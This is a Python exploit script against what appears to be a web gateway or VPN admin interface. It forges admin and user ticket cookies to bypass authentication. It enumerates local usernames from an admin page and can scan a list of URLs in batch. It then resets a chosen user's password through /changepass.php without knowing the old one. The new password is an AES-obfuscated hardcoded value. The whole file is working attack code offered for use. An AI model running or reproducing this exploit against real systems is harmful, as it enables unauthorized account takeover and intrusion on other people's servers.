import requests
import re
import argparse
import urllib3
urllib3.disable_warnings()
from bs4 import BeautifulSoup


proxy = {
}


def check_poc1(url):
    header = {
        "Cookie": "admin_id=1; gw_admin_ticket=1;",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
    }
    found_users = []
    for id in range(1, 3): #The recommended id cannot exceed 5
        try:
            path = "/admin/group/x_group.php?id={}".format(id)
            url = url.strip('/')
            r = requests.get(url + path, headers=header, proxies=proxy, verify=False, timeout=5)
            r.encoding = "utf-8"
            r.raise_for_status()
            if r.status_code == 200 and "group_action.php" in r.text:
                if users := re.findall("本地认证(.*?)</option>", r.text):
                    soup = BeautifulSoup(r.text, "html.parser")
                    option_tags = soup.find_all("option")
                    users = []
                    for option in option_tags:
                        text = option.text.strip()
                        username = re.sub(r"本地认证(->|->&gt;)", "", text)
                        if username:
                            users.append(username)
                    found_users.extend(users)
        except requests.exceptions.RequestException as e:
            print("[!] An error occurred:", e)
            print("\r")
            return []

    if found_users:
        print("[+] " + url)
        print("Found users:")
        print(found_users)
        print()
        with open("Success.txt", "a") as f:
            f.write(f"{url}\n")
            f.close()
    else:
        print("No users found,Please check the network")
    return found_users


from Crypto.Cipher import AES
import base64
import hashlib


def aes_decrypt(key, ciphertext):
    cipher = AES.new(key, AES.MODE_ECB)
    decrypted_data = cipher.decrypt(base64.b64decode(ciphertext))
    return unpad(decrypted_data, AES.block_size)

def unpad(data, block_size):
    padding_len = data[-1]
    return data[:-padding_len].decode()

key = hashlib.md5("jinnitaimei".encode()).digest()
ciphertext = "6wdwPqZw7GSvkOp1WgE1sg=="
ciphertext2 = "biRylIVL3f/o8gR/tPbspw=="


def check_poc2(url,password):
    this_name = input("Enter the value for the obtained UserName: ")
    header = {
        "Cookie": 'gw_user_ticket=ffffffffffffffffffffffffffffffff; user_lang_id=; last_step_param={{"this_name": "{}","subAuthId": "1"}}'.format(this_name),
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
        "Origin": url,
        "Referer": "%s/welcome.php" % url
    }
    body = {
        "old_pass": "",
        "password": "{}".format(password),
        "repassword": "{}".format(password)
    }
    path = "/changepass.php?type=2"
    try:
        r = requests.post(url + path, headers=header, data=body, proxies=proxy, verify=False, timeout=5)
        r.encoding = "utf-8"
        if r.status_code == 200 and "修改密码成功" in r.text:
            print("[*] Password changed successfully,URL: "+url+"\r")
            print("UserName: {}, PassWord: 仅ikun可见")
        else:
            print("[-] Password change failed")
    except requests.exceptions.RequestException as e:
        print("[!] An error occurred:",e)
        print("\r")
        return []


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="URL checker")
    parser.add_argument("-u", "--url", help="URL to check")
    parser.add_argument("-f", "--file", help="Path to file containing URLs (one per line)")
    parser.add_argument("-check", action="store_true", help="Enable check_poc1 module")
    parser.add_argument("-exp", action="store_true", help="Enable check_poc2 module")
    parser.add_argument("-p","--password", action="store_true", help="Enable aes_decrypt module")
    args = parser.parse_args()

    if args.url:
        if args.check:
            check_poc1(args.url.strip('/'))
        elif args.exp:
            users = check_poc1(args.url.strip('/'))
            if users:
                password = aes_decrypt(key, ciphertext)
                check_poc2(args.url.strip('/'),password)
        else:
            print("URL provided, but no module selected.")

    if args.file:
        with open(args.file, "r") as file:
            urls = file.read().splitlines()
            urls = [url.strip('/') for url in urls]
            if args.exp:
                    print("exp module does not support batch detection. You need to manually enter the existing UserName")
            for url in urls:
                if args.check:
                    check_poc1(url)

    if args.password:
        pwd = input("Enter KunKun birthday to decrypt the password, format: 2023-06-06: ")
        if pwd == aes_decrypt(key,ciphertext2):
            print("PassWord: "+aes_decrypt(key, ciphertext))
